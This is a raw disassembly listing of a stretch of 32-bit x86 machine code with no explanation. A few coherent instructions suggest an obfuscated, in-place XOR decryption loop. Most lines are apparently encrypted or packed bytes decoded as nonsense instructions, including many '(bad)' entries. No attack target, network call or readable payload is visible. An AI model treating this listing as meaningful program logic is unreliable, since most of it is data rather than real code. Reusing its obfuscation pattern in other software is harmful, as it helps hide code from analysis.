  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e75e,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	dec    esp
  4028e1:	in     eax,0xe5
  4028e3:	cmp    eax,0x7e7e03e6
  4028e8:	xor    BYTE PTR [ecx+0x7e],0x7e
  4028ec:	mov    cl,ah
  4028ee:	jecxz  0x4028a1
  4028f0:	les    ebp,FWORD PTR [ecx+0x649a3b15]
  4028f6:	in     eax,dx
  4028f7:	lahf   
  4028f8:	stos   DWORD PTR es:[edi],eax
  4028f9:	inc    esi
  4028fa:	jmp    0x40290c
  4028fc:	ins    BYTE PTR es:[edi],dx
  4028fd:	push   ds
  4028fe:	cmp    bl,bl
  402900:	fistp  WORD PTR [edi]
  402902:	xchg   DWORD PTR [esi],ebp
  402904:	(bad)  
  402905:	inc    edx
  402906:	data16 and cl,BYTE PTR [ecx-0x56]
  40290a:	enter  0x48d4,0xb7
  40290e:	add    ch,BYTE PTR [eax+edx*8]
  402911:	xor    al,0x8c
  402913:	stc    
  402914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402915:	fistp  QWORD PTR [eax-0x20]
  402918:	rcr    BYTE PTR [eax],0x3a
  40291b:	jbe    0x4028f8
  40291d:	enter  0x56d5,0xe1
  402921:	adc    esi,esi
  402923:	in     eax,dx
  402924:	and    dh,BYTE PTR [edx+0x722b87c0]
  40292a:	icebp  
  40292b:	test   eax,0xd3c826d7
  402930:	xchg   BYTE PTR [eax+0x39],cl
  402933:	push   0x70b162a0
  402938:	inc    ecx
  402939:	mov    ds:0xe50d6dfb,al
  40293e:	aaa    
  40293f:	(bad)  
  402940:	adc    eax,0xe5687519
  402945:	push   esp
  402946:	nop    DWORD PTR [eax+0x2e]
  40294a:	inc    ebx
  40294b:	adc    dl,al
  40294d:	pop    ecx
  40294e:	fsubp  st(2),st
  402950:	das    
  402951:	test   BYTE PTR [ecx],0x31
  402954:	mov    al,BYTE PTR [esi+0x46]
  402957:	imul   eax,DWORD PTR [ebp-0xf],0xffffffa4
  40295b:	repz ror DWORD PTR [ebx+eax*1-0x7e7f5ccf],cl
  402963:	xlat   BYTE PTR ds:[ebx]
  402964:	daa    
  402965:	mov    DWORD PTR [edx+0x41],esi
  402968:	lods   al,BYTE PTR ds:[esi]
  402969:	xor    edx,DWORD PTR [ebx-0xc]
  40296c:	cdq    
  40296d:	call   0x6b14:0x15b8491c
  402974:	push   ds
  402975:	fwait
  402976:	gs jnp 0x402980
  402979:	pop    ebp
  40297a:	aaa    
  40297b:	call   0x62799f1a
  402980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402981:	pop    edi
  402982:	sub    DWORD PTR [esi+ebp*1-0x12],eax
  402986:	dec    ebx
  402987:	or     DWORD PTR [ebx],ecx
  402989:	xor    bh,0x16
  40298c:	stos   BYTE PTR es:[edi],al
  40298d:	imul   ebp,DWORD PTR [ebp-0xbc12cd2],0x2d06709e
  402997:	sbb    DWORD PTR [eax+0x5e],ebp
  40299a:	call   0xfd9a:0xba10144d
  4029a1:	pop    es
  4029a2:	pop    ecx
  4029a3:	f2xm1  
  4029a5:	cmp    DWORD PTR [ebx-0x79de002],esi
  4029ab:	or     BYTE PTR es:[esi-0x18],cl
  4029af:	aad    0x9e
  4029b1:	dec    eax
  4029b2:	push   ebp
  4029b3:	jmp    0x402942
  4029b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029b6:	mov    ebx,0xaa7fdbbb
  4029bb:	shl    BYTE PTR [eax],1
  4029bd:	cld    
  4029be:	add    ebp,esp
  4029c0:	pop    ecx
  4029c1:	lds    edx,FWORD PTR [esp+ebx*8+0x44]
  4029c5:	test   eax,0xfe0c4907
  4029ca:	(bad)  
  4029cb:	mov    al,0x9
  4029cd:	inc    ecx
  4029ce:	(bad)  
  4029cf:	sbb    ch,ch
  4029d1:	sbb    esi,DWORD PTR [eax-0x39b1772b]
  4029d7:	pop    ebp
  4029d8:	test   BYTE PTR [edx+0x74],bl
  4029db:	add    eax,0xda3a4314
  4029e0:	adc    BYTE PTR [ecx+0x42faf366],0x4c
  4029e7:	or     al,0xf7
  4029e9:	cmp    BYTE PTR [esi+0x3e3f1995],dl
  4029ef:	iret   
  4029f0:	ret    0x90d6
  4029f3:	mov    bl,0x17
  4029f5:	xchg   edi,eax
  4029f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029f7:	dec    esp
  4029f8:	and    ah,dh
  4029fa:	addr16 cmp al,0x2c
  4029fd:	dec    eax
  4029fe:	adc    al,0xc
  402a00:	pop    esp
  402a01:	xor    bl,BYTE PTR [edi+esi*1+0xc33785f]
  402a08:	repz sub bl,BYTE PTR [ebp+0x77]
  402a0c:	outs   dx,BYTE PTR ds:[esi]
  402a0d:	or     DWORD PTR fs:[esi+0x69f6c12f],ecx
  402a14:	xor    DWORD PTR ds:0xddc75610,ebx
  402a1a:	mov    edx,0xfb5fd28
  402a1f:	and    BYTE PTR [eax],bl
  402a21:	mov    bl,0x5d
  402a23:	test   al,0xe2
  402a25:	jne    0x402a6f
  402a27:	mov    DWORD PTR [esi],edi
  402a29:	mov    edi,0xbefcbab
  402a2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a2f:	out    dx,al
  402a30:	pusha  
  402a31:	jne    0x402aac
  402a33:	jne    0x402a85
  402a35:	mov    cs,WORD PTR [edi]
  402a37:	xchg   edi,eax
  402a38:	pop    esi
  402a39:	mov    ebx,0x8d96aa1d
  402a3e:	add    al,0x14
  402a40:	dec    eax
  402a41:	scas   eax,DWORD PTR es:[edi]
  402a42:	test   eax,0x3226ef77
  402a47:	dec    ecx
  402a48:	jno    0x402a90
  402a4a:	or     BYTE PTR [ebp+ecx*4+0x1781aa0],ah
  402a51:	jge    0x402a9e
  402a53:	mov    dh,0xb7
  402a55:	push   ds
  402a56:	shl    BYTE PTR [eax+0x232dd603],cl
  402a5c:	xchg   ecx,eax
  402a5d:	mov    ebp,0xfe4ff902
  402a62:	inc    edx
  402a63:	inc    ebp
  402a64:	mov    ebx,0x23303fa
  402a69:	add    DWORD PTR [ebx-0x645b4f97],0x39
  402a70:	enter  0xdbe7,0x58
  402a74:	stc    
  402a75:	mov    dl,BYTE PTR [edx-0x2238f352]
  402a7b:	sub    eax,0xae11043a
  402a80:	push   edx
  402a81:	(bad)  
  402a82:	pop    eax
  402a83:	dec    eax
  402a84:	aad    0x49
  402a86:	in     eax,dx
  402a87:	mov    edi,0x896c71fc
  402a8c:	and    al,BYTE PTR [edx]
  402a8e:	push   ebp
  402a8f:	dec    eax
  402a90:	stos   BYTE PTR es:[edi],al
  402a91:	fnstcw WORD PTR [edi+0x42]
  402a94:	dec    edx
  402a95:	es inc esp
  402a97:	fcom   QWORD PTR [ebp+0x63]
  402a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a9b:	mov    dh,0x80
  402a9d:	stos   BYTE PTR es:[edi],al
  402a9e:	std    
  402a9f:	inc    edi
  402aa0:	cli    
  402aa1:	daa    
  402aa2:	shl    BYTE PTR [ecx+0x6765bc90],0xee
  402aa9:	fs push ds
  402aab:	xlat   BYTE PTR ds:[ebx]
  402aac:	add    eax,0x90704d07
  402ab1:	shl    DWORD PTR [ecx-0x5a],1
  402ab4:	xchg   ebx,eax
  402ab5:	xchg   edi,eax
  402ab6:	mov    ?,WORD PTR ds:0x121dc485
  402abc:	pop    edi
  402abd:	adc    DWORD PTR [edx-0x21],esi
  402ac0:	adc    ch,BYTE PTR [eax+0x52e8c52a]
  402ac6:	push   ecx
  402ac7:	push   0xffffffb6
  402ac9:	popf   
  402aca:	sub    ebx,DWORD PTR [ebx+esi*2]
  402acd:	mov    BYTE PTR [edx+0x144c8a76],al
  402ad3:	jae    0x402a7a
  402ad5:	(bad)  
  402ad6:	repz ficom DWORD PTR [esi+ecx*1-0x9]
  402adb:	and    BYTE PTR [esi-0x1a85cbd6],ah
  402ae1:	inc    esp
  402ae2:	or     cl,BYTE PTR [ecx-0x19]
  402ae5:	fdivr  st(7),st
  402ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ae8:	push   0xffffffae
  402aea:	jg     0x402ab6
  402aec:	popf   
  402aed:	loop   0x402a9c
  402aef:	and    ah,bl
  402af1:	pusha  
  402af2:	pop    edi
  402af3:	sbb    edx,DWORD PTR [ebx+ebp*8-0x409747b3]
  402afa:	jp     0x402b76
  402afc:	mov    edi,0xa5b62825
  402b01:	pop    ecx
  402b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b03:	xchg   ecx,eax
  402b04:	dec    esp
  402b05:	lahf   
  402b06:	lods   eax,DWORD PTR ds:[esi]
  402b07:	les    eax,FWORD PTR [edx-0x2ae8961c]
  402b0d:	shr    DWORD PTR [edi-0x6d0d0ab9],1
  402b13:	enter  0xc5f9,0xcf
  402b17:	dec    ecx
  402b18:	hlt    
  402b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b1a:	adc    DWORD PTR [ecx],edi
  402b1c:	push   es
  402b1d:	pop    ds
  402b1e:	mov    eax,0xe548b880
  402b23:	jp     0x402ab0
  402b25:	add    edx,ebp
  402b27:	in     eax,0xf
  402b29:	hlt    
  402b2a:	or     al,0x66
  402b2c:	push   esi
  402b2d:	(bad)  
  402b2e:	aaa    
  402b2f:	add    eax,0x31f84775
  402b34:	pop    esi
  402b35:	mov    al,0x58
  402b37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b38:	adc    BYTE PTR [ebx-0x3b55ca22],0x3d
  402b3f:	pop    edi
  402b40:	mov    cl,0xc7
  402b42:	jno    0x402bc0
  402b44:	sub    al,0xf8
  402b46:	xchg   ecx,eax
  402b47:	or     eax,0x8c54015d
  402b4c:	jmp    0xcc840c35
  402b51:	hlt    
  402b52:	mov    esp,0xc332eefe
  402b57:	dec    ecx
  402b58:	jge    0x402b10
  402b5a:	pop    ss
  402b5b:	iret   
  402b5c:	sub    eax,0xad4745d5
  402b61:	pushf  
  402b62:	cli    
  402b63:	sub    bh,BYTE PTR [ecx-0x8feda2f]
  402b69:	arpl   WORD PTR [esi+0x4a7ed7f7],si
  402b6f:	daa    
  402b70:	std    
  402b71:	sub    BYTE PTR [ecx-0x6c3e78c2],bl
  402b77:	inc    ebp
  402b78:	(bad)  
  402b79:	rcl    DWORD PTR [ebp-0x59ed47dd],1
  402b7f:	xchg   BYTE PTR [edx+0x61],ch
  402b82:	sub    ah,BYTE PTR [eax+0x2e]
  402b85:	mov    ss,WORD PTR cs:[eax-0x33]
  402b89:	jae    0x402b78
  402b8b:	xchg   BYTE PTR [eax-0x7f],dh
  402b8e:	mov    ebp,0x8a5f8ba2
  402b93:	sbb    dl,BYTE PTR [ebp+0x24f18c04]
  402b99:	jg     0x402bf3
  402b9b:	jbe    0x402b8c
  402b9d:	jmp    0x402b69
  402b9f:	adc    al,ch
  402ba1:	out    0x2c,al
  402ba3:	xor    ebp,ebp
  402ba5:	popf   
  402ba6:	and    DWORD PTR [edi+0x3845b8af],edx
  402bac:	cli    
  402bad:	mov    cl,0xfc
  402baf:	mov    dl,dl
  402bb1:	test   DWORD PTR [edx+0x64],edx
  402bb4:	ins    DWORD PTR es:[edi],dx
  402bb5:	into   
  402bb6:	push   esi
  402bb7:	out    dx,eax
  402bb8:	imul   esi,edx,0x5105e1f7
  402bbe:	(bad)  
  402bc0:	ret    0xe79d
  402bc3:	sub    BYTE PTR [ebp-0x753f70e3],dh
  402bc9:	or     DWORD PTR ds:0xb03b38eb,esi
  402bcf:	xor    al,0x6
  402bd1:	xchg   esi,eax
  402bd2:	jg     0x402c0b
  402bd4:	and    BYTE PTR [ecx],dl
  402bd6:	jo     0x402bcc
  402bd8:	ds mov bl,0xb3
  402bdb:	or     al,0x41
  402bdd:	adc    al,0x3b
  402bdf:	sbb    al,0x6d
  402be1:	xchg   edx,eax
  402be2:	push   ebp
  402be3:	adc    eax,0xa10c7641
  402be8:	or     bh,BYTE PTR [eax]
  402bea:	adc    al,0x7b
  402bec:	inc    ebp
  402bed:	ins    DWORD PTR es:[edi],dx
  402bee:	jge    0x402b7c
  402bf0:	jbe    0x402bed
  402bf2:	jle    0x402b9e
  402bf4:	lods   al,BYTE PTR ds:[esi]
  402bf5:	mov    dl,bh
  402bf7:	jo     0x402b93
  402bf9:	call   0xe996e33a
  402bfe:	out    0x39,eax
  402c00:	ins    BYTE PTR es:[edi],dx
  402c01:	mov    WORD PTR [esi],ds
  402c03:	cmp    al,0xe7
  402c05:	and    BYTE PTR [edi+ebx*1+0x965f425],dh
  402c0c:	and    ebp,ebp
  402c0e:	push   0x2a
  402c10:	mov    ds:0xb7913e81,al
  402c15:	jp     0x402c22
  402c17:	mov    cl,0xdf
  402c19:	push   esp
  402c1a:	adc    al,0xa3
  402c1c:	nop
  402c1d:	pop    ds
  402c1e:	xchg   ecx,eax
  402c1f:	mov    dl,0x80
  402c21:	jge    0x402be3
  402c23:	inc    ebp
  402c24:	and    eax,0x7c9f8396
  402c29:	out    0x57,al
  402c2b:	arpl   WORD PTR [eax-0x6f],bx
  402c2e:	xor    esp,esp
  402c30:	push   ecx
  402c31:	test   BYTE PTR [ebp-0x278462af],cl
  402c37:	xchg   ebx,eax
  402c38:	pop    ecx
  402c39:	pop    ecx
  402c3a:	push   esp
  402c3b:	mov    esi,0x4a40782d
  402c40:	mov    esi,0x2de212a4
  402c45:	inc    edi
  402c46:	data16 xchg BYTE PTR [eax+0x2a],ch
  402c4a:	call   FWORD PTR [edi]
  402c4c:	mov    WORD PTR [esi-0x382e92e],es
  402c52:	not    BYTE PTR [eax-0x61]
  402c55:	cmp    ebp,DWORD PTR [esi]
  402c57:	arpl   WORD PTR [ebx+0x3e],di
  402c5a:	imul   ecx,edi,0x42
  402c5d:	add    ebx,DWORD PTR ds:0x47f7d89f
  402c63:	and    BYTE PTR [esi+0x13],0x91
  402c67:	inc    esi
  402c68:	xor    BYTE PTR [ecx-0x16],dl
  402c6b:	jg     0x402c21
  402c6d:	fisub  DWORD PTR [ebx-0x20ea066e]
  402c73:	popa   
  402c74:	stos   BYTE PTR es:[edi],al
  402c75:	mov    ebx,DWORD PTR ds:0x81b099c6
  402c7b:	xor    esp,DWORD PTR [edx-0x7460792a]
  402c81:	inc    ebp
  402c82:	lock and DWORD PTR [eax],0x751c9d
  402c89:	jmp    0x402858
  402c8e:	mov    eax,DWORD PTR [ebp-0xc]
  402c91:	mov    edx,DWORD PTR [ebp-0x18]
  402c94:	or     eax,edx
  402c96:	cmp    eax,0xfabf2dff
  402c9b:	je     0x403060
  402ca1:	mov    eax,DWORD PTR [ebp-0x10]
  402ca4:	xor    DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	dec    ebp
  402cc1:	push   ds
  402cc2:	test   DWORD PTR [ecx],0x7e7e070a
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	fld    TBYTE PTR [edi]
  402cce:	jmp    0x1561:0x6abb1fe7
  402cd5:	call   DWORD PTR es:[ebx-0x3f90a714]
  402cdc:	jge    0x402cf9
  402cde:	pop    esp
  402cdf:	adc    dl,BYTE PTR [edx+0x19a6c919]
  402ce5:	xchg   edi,eax
  402ce6:	stc    
  402ce7:	xchg   ebp,eax
  402ce8:	push   edi
  402ce9:	scas   eax,DWORD PTR es:[edi]
  402cea:	sub    BYTE PTR [ebx+0xa],bl
  402ced:	setg   BYTE PTR [ebp+edx*1-0x53044103]
  402cf5:	in     eax,dx
  402cf6:	xchg   esp,eax
  402cf7:	xor    BYTE PTR [esi],bl
  402cf9:	adc    DWORD PTR [eax+0x505c53c3],esi
  402cff:	fld    TBYTE PTR [esi]
  402d01:	jle    0x402d51
  402d03:	and    BYTE PTR [ebp+0x10],0xe8
  402d07:	mov    eax,edx
  402d09:	fstp   TBYTE PTR [ebp+0x68]
  402d0c:	sahf   
  402d0d:	push   ebp
  402d0e:	(bad)  
  402d11:	mov    eax,esi
  402d13:	xor    edi,DWORD PTR [ecx]
  402d15:	inc    esp
  402d16:	or     esi,DWORD PTR [ecx]
  402d18:	cdq    
  402d19:	pop    ecx
  402d1a:	pop    edx
  402d1b:	jns    0x402d59
  402d1d:	mov    edi,0x7c0cfbe3
  402d22:	or     BYTE PTR [esi],ah
  402d24:	sub    al,0x99
  402d27:	dec    esi
  402d28:	dec    ebx
  402d29:	adc    DWORD PTR [esi+ecx*1-0x57],0xffffffaf
  402d2e:	call   0x8758ed1
  402d33:	aas    
  402d34:	leave  
  402d35:	(bad)  
  402d36:	sbb    edx,esp
  402d38:	adc    eax,0xd7e42091
  402d3d:	mov    ds:0xf3d85c55,eax
  402d42:	(bad)  
  402d43:	mov    ebp,0x2ed18305
  402d48:	daa    
  402d49:	pop    eax
  402d4a:	ficom  WORD PTR [ebx-0x69]
  402d4d:	push   edx
  402d4e:	or     dh,al
  402d50:	inc    edi
  402d51:	cmp    al,BYTE PTR [ecx]
  402d53:	jp     0x402d9d
  402d55:	pop    ds
  402d56:	and    ch,bh
  402d58:	int    0xe9
  402d5a:	cmc    
  402d5b:	and    BYTE PTR es:[eax-0x67],ah
  402d5f:	cmp    al,0x2a
  402d61:	(bad)  
  402d62:	in     al,dx
  402d63:	hlt    
  402d64:	neg    DWORD PTR [eax+eiz*4]
  402d67:	jecxz  0x402cfa
  402d69:	jmp    0x402cef
  402d6b:	outs   dx,DWORD PTR ds:[esi]
  402d6c:	sub    esp,DWORD PTR [eax+0x8214f40]
  402d72:	retf   0x61c5
  402d75:	add    cl,BYTE PTR [ecx]
  402d77:	bound  ebx,QWORD PTR [eax]
  402d79:	pop    esi
  402d7a:	mov    DWORD PTR [esi+0xa],0x23d98a63
  402d81:	inc    BYTE PTR es:[ebx+0xbf9a1e9]
  402d88:	jne    0x402deb
  402d8a:	pop    eax
  402d8b:	jge    0x402dfe
  402d8d:	dec    esp
  402d8e:	mov    esp,0xe197f87f
  402d93:	ret    
  402d94:	push   edx
  402d95:	test   al,0xcc
  402d97:	mov    ebx,0x24941563
  402d9c:	jle    0x402dd9
  402d9e:	jns    0x402d8a
  402da0:	adc    al,0x79
  402da2:	add    bl,cl
  402da4:	pop    ds
  402da5:	iret   
  402da6:	mov    bl,0x10
  402da8:	dec    eax
  402da9:	xchg   DWORD PTR [ebx+0x859a85b],ecx
  402daf:	xchg   DWORD PTR [esi],ecx
  402db1:	int3   
  402db2:	(bad)  
  402db3:	and    bl,BYTE PTR [ecx-0x57]
  402db6:	arpl   bp,sp
  402db8:	sub    esp,eax
  402dba:	loope  0x402dde
  402dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dbd:	ja     0x402d43
  402dbf:	pop    ss
  402dc0:	shl    bl,1
  402dc2:	xor    edx,DWORD PTR [ecx-0x7f]
  402dc5:	pop    es
  402dc6:	retf   0xbbd1
  402dc9:	pop    eax
  402dca:	sub    BYTE PTR [edi+eax*4+0x3becd2a3],dh
  402dd1:	mov    al,ds:0x7c570bb3
  402dd6:	pop    ebx
  402dd7:	jmp    0x49ab:0x843ee93a
  402dde:	or     eax,0x7c1a66a5
  402de3:	jbe    0x402e13
  402de5:	sbb    BYTE PTR [esi-0x5cedea4e],dl
  402deb:	aad    0x13
  402ded:	jle    0x402dfc
  402def:	cli    
  402df0:	pushf  
  402df1:	les    edx,FWORD PTR ds:0x668644b5
  402df7:	and    BYTE PTR [ebx+0x7186849],dh
  402dfd:	mov    cs,WORD PTR [eax]
  402dff:	jmp    0x71a8ae19
  402e04:	(bad)  
  402e05:	pop    ecx
  402e06:	dec    edi
  402e07:	stos   DWORD PTR es:[edi],eax
  402e08:	loop   0x402e21
  402e0a:	jno    0x402de1
  402e0c:	mov    esi,0x5ec65b1a
  402e11:	sbb    edx,esi
  402e13:	(bad)
  402e16:	push   esp
  402e17:	fcmovb st,st(5)
  402e19:	add    eax,0x7b09bc94
  402e1e:	stos   BYTE PTR es:[edi],al
  402e1f:	hlt    
  402e20:	pop    edx
  402e21:	pushf  
  402e22:	jmp    0x402ea2
  402e24:	cmp    eax,0xccbb6e2d
  402e29:	xchg   ecx,esi
  402e2b:	inc    esp
  402e2c:	ja     0x402dc8
  402e2e:	mov    bl,0x58
  402e30:	xchg   esi,eax
  402e31:	cmp    ebp,esp
  402e33:	xor    ecx,DWORD PTR [esi+ebp*2]
  402e36:	push   eax
  402e37:	push   0xb41b21ab
  402e3c:	into   
  402e3d:	sbb    DWORD PTR [ebp+0x166a6431],edi
  402e43:	rcl    DWORD PTR [ebp-0x5caa1220],1
  402e49:	mov    DWORD PTR [esi],ebp
  402e4b:	mov    ds:0xc358b456,eax
  402e50:	jmp    0x402e25
  402e52:	loop   0x402e47
  402e54:	shl    BYTE PTR [eax],1
  402e56:	cdq    
  402e57:	test   DWORD PTR [ebx+0x5b],esi
  402e5a:	xchg   ebx,ebx
  402e5c:	mov    ds:0xab0eaf7f,eax
  402e61:	mov    eax,0xd5a2cd1a
  402e66:	sar    BYTE PTR [edi],cl
  402e68:	dec    ecx
  402e69:	lahf   
  402e6a:	ss inc ebx
  402e6c:	repnz sub ch,BYTE PTR [eax-0x20dee764]
  402e73:	aam    0xfe
  402e75:	or     eax,DWORD PTR [ebp-0xe0f8744]
  402e7b:	and    eax,0x1c7f37b4
  402e80:	shr    DWORD PTR [ecx+ebp*8-0x2d],cl
  402e84:	inc    esi
  402e85:	pop    esi
  402e86:	retf   
  402e87:	sahf   
  402e88:	(bad)  
  402e89:	mov    ecx,ebp
  402e8b:	(bad)  
  402e8c:	leave  
  402e8d:	mov    al,ds:0x46f05e75
  402e92:	clc    
  402e93:	sahf   
  402e94:	xchg   esp,eax
  402e95:	push   eax
  402e96:	or     esp,DWORD PTR [ebx+0x7e]
  402e99:	xor    al,BYTE PTR [edi]
  402e9b:	mov    dh,cl
  402e9d:	aas    
  402e9e:	mov    bl,0x3c
  402ea0:	sti    
  402ea1:	sbb    edx,DWORD PTR [edx]
  402ea3:	mov    ebx,0xa5e368fc
  402ea8:	mov    bl,0x58
  402eaa:	pushf  
  402eab:	xor    eax,0xd11fdae0
  402eb0:	retf   0xb0f5
  402eb3:	xchg   esp,eax
  402eb4:	(bad)  
  402eb6:	inc    esp
  402eb7:	out    0x8f,eax
  402eb9:	mov    cl,0x15
  402ebb:	out    dx,al
  402ebc:	pusha  
  402ebd:	in     eax,dx
  402ebe:	gs xchg edi,eax
  402ec0:	popa   
  402ec1:	pop    ds
  402ec2:	xchg   esi,eax
  402ec3:	inc    edx
  402ec4:	or     al,0xc1
  402ec6:	and    ah,BYTE PTR [ebx+0x33]
  402ec9:	dec    esi
  402eca:	jo     0x402f45
  402ecc:	aad    0xda
  402ece:	sti    
  402ecf:	inc    esi
  402ed0:	ins    BYTE PTR es:[edi],dx
  402ed1:	jno    0x402e77
  402ed3:	ret    
  402ed4:	jbe    0x402e8c
  402ed6:	mov    al,0x49
  402ed8:	mov    BYTE PTR [ebp+0x5ff717bc],bl
  402ede:	sbb    ecx,DWORD PTR [ebx+0x70253042]
  402ee4:	push   eax
  402ee5:	push   ebp
  402ee6:	xchg   ecx,eax
  402ee7:	loop   0x402f05
  402ee9:	sbb    DWORD PTR [ecx],0xbd3a7c79
  402eef:	mov    eax,ds:0x482db95e
  402ef4:	push   esp
  402ef5:	sub    ah,BYTE PTR [ebx]
  402ef7:	stos   BYTE PTR es:[edi],al
  402ef8:	sub    ecx,DWORD PTR [ebp-0x762b90]
  402efe:	sub    DWORD PTR [edx],0xfffffff2
  402f01:	sub    al,0xfd
  402f03:	cwde   
  402f04:	stos   DWORD PTR es:[edi],eax
  402f05:	aaa    
  402f06:	mov    dh,0x3f
  402f08:	inc    ecx
  402f09:	xor    al,0x4f
  402f0b:	mov    gs,edx
  402f0d:	shl    BYTE PTR ds:0xa687a417,0x97
  402f14:	mov    bl,0x70
  402f16:	stos   BYTE PTR es:[edi],al
  402f17:	in     al,dx
  402f18:	pop    eax
  402f19:	retf   0x1ece
  402f1c:	and    al,0xf0
  402f1e:	aam    0x5e
  402f20:	(bad)  
  402f21:	inc    edx
  402f22:	inc    ecx
  402f23:	xchg   BYTE PTR [eax+ebx*4+0x1a1562a2],cl
  402f2a:	sbb    eax,0xf4d74204
  402f2f:	jge    0x402f93
  402f31:	ins    BYTE PTR es:[edi],dx
  402f32:	shl    dl,0xc7
  402f35:	pop    es
  402f36:	aas    
  402f37:	push   esi
  402f38:	popf   
  402f39:	and    ebx,ebx
  402f3b:	cld    
  402f3c:	leave  
  402f3d:	adc    eax,0x1de7e6ff
  402f42:	cs and eax,0x9174285d
  402f48:	loopne 0x402f67
  402f4a:	xchg   ecx,eax
  402f4b:	ins    BYTE PTR es:[edi],dx
  402f4c:	mov    bl,BYTE PTR [ebx+ecx*2-0x59b44dfc]
  402f53:	dec    eax
  402f54:	push   esp
  402f55:	scas   al,BYTE PTR es:[edi]
  402f56:	adc    DWORD PTR [edx-0x7cd6f238],esp
  402f5c:	or     edx,esi
  402f5e:	inc    esi
  402f5f:	fsub   DWORD PTR [edx+0x5d3558e4]
  402f65:	push   edx
  402f66:	ss das 
  402f68:	jg     0x402f5a
  402f6a:	sub    DWORD PTR [edx],eax
  402f6c:	cli    
  402f6d:	addr16 ret 
  402f6f:	mov    ds:0x6b7898cd,al
  402f74:	push   ss
  402f75:	inc    eax
  402f76:	inc    eax
  402f77:	cmc    
  402f78:	jmp    0x516f:0xe5d26dbf
  402f7f:	adc    ch,BYTE PTR [esi+0x12]
  402f82:	rcr    cl,cl
  402f84:	jge    0x402fc3
  402f86:	icebp  
  402f87:	mov    dl,0x87
  402f89:	mov    al,BYTE PTR [edi-0x36]
  402f8c:	(bad)  
  402f8d:	loope  0x402f2e
  402f8f:	cmp    eax,0xdfb58743
  402f94:	dec    esi
  402f95:	jmp    FWORD PTR ds:0x4aa9e3f8
  402f9b:	iret   
  402f9c:	call   0xdf9b:0xa8f84809
  402fa3:	imul   ebp,edi,0xef53dca6
  402fa9:	cmp    al,0xa2
  402fab:	or     ah,BYTE PTR [ebp+0x5ec8af81]
  402fb1:	dec    eax
  402fb2:	es mov edx,0xb0e445b5
  402fb9:	sbb    bh,BYTE PTR [edx]
  402fbb:	xchg   esi,eax
  402fbc:	imul   eax,DWORD PTR [eax-0x35110235],0xfffffff4
  402fc3:	mov    al,ds:0x7d4c7aca
  402fc8:	adc    bl,cl
  402fca:	(bad)  
  402fcb:	mov    ds:0xc8bebe8f,eax
  402fd0:	add    eax,0x38ec93cf
  402fd5:	stc    
  402fd6:	sbb    esp,DWORD PTR [ecx+0x1d]
  402fd9:	adc    bl,BYTE PTR [ebx-0x5fdede1f]
  402fdf:	pop    esp
  402fe0:	dec    edi
  402fe1:	nop
  402fe2:	and    DWORD PTR [edx],eax
  402fe4:	xchg   BYTE PTR [eax-0x428ac829],dl
  402fea:	add    al,0x16
  402fec:	mov    edx,0x546b68f3
  402ff1:	mov    ?,WORD PTR [ebx]
  402ff3:	cli    
  402ff4:	jl     0x403018
  402ff6:	aaa    
  402ff7:	pop    ebp
  402ff8:	mov    esp,DWORD PTR [ecx+0xa99776a]
  402ffe:	repnz das 
  403000:	push   eax
  403001:	mov    ds:0x28bf0f77,eax
  403006:	sub    ecx,DWORD PTR [edi+0x2507db85]
  40300c:	push   esp
  40300d:	ret    
  40300e:	js     0x403066
  403010:	mov    DWORD PTR [ebx-0x51],esp
  403013:	cs pop eax
  403015:	(bad)  
  403016:	jnp    0x403089
  403018:	(bad)  
  403019:	jmp    0x2684:0x5410c8c4
  403020:	add    eax,0x45520bc8
  403025:	pop    ecx
  403026:	xchg   edx,eax
  403027:	jns    0x403041
  403029:	gs inc esp
  40302b:	or     al,0xdb
  40302d:	fcom   st(4)
  40302f:	xor    bl,0xe2
  403032:	lar    eax,WORD PTR [eax+0x75]
  403036:	out    dx,al
  403037:	jl     0x402fed
  403039:	inc    esi
  40303a:	loop   0x40302d
  40303c:	retf   0xb01d
  40303f:	fwait
  403040:	(bad)  
  403041:	inc    DWORD PTR [ebx+eax*2-0x2f]
  403045:	stc    
  403046:	fdiv   st,st(7)
  403048:	xlat   BYTE PTR ds:[ebx]
  403049:	pushf  
  40304a:	sbb    ah,ch
  40304c:	clc    
  40304d:	jno    0x403052
  40304f:	(bad)  
  403050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403051:	jge    0x4030b1
  403053:	push   es
  403054:	test   eax,0x60297577
  403059:	arpl   WORD PTR [eax-0x69d77b4a],cx
  40305f:	jg     0x4030c7
  403061:	mov    eax,DWORD PTR [ebp-0x4]
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
